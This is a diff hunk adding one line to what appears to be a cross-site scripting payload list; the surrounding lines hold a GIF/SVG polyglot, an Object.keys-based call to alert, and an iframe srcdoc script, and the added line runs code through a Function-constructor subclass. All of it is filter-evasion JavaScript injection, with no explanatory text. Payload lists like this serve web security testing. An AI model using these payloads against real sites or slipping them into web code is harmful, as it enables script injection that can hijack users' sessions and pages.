@@ -1728,3 +1728,4 @@ GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
 <script>this[Object["keys"](this)[146]](1)</script>
 <script>this[Object["keys"](this)[5]](1)</script>
 <iframe srcdoc="&lt;script&gt;alert(document.domain)&lt;/script&gt;">
+(new class extends Function{x(){super.constructor('alert(1)')()}}).x()
